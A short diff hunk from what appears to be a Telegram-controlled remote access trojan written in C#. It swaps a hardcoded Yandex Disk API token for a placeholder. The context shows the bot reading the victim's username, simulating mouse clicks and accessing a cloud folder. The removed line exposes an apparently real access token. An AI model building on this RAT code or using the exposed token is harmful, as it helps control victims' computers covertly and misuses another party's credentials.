@@ -49,7 +49,7 @@ namespace Telegram_Rat_Bot
             var message = update.Message;
             string userName = Environment.UserName;
             ClickMouse click = new ClickMouse();
-            var api = new DiskHttpApi("y0_AgAAAABik9_KAAjxOgAAAADXp7IF9Lvv1DcITeOJyBQhtvRjw5LQ16I");
+            var api = new DiskHttpApi("yadiskAPI");
             var roodFolderData = await api.MetaInfo.GetInfoAsync(new ResourceRequest
             {
                 Path = "/televoog/"
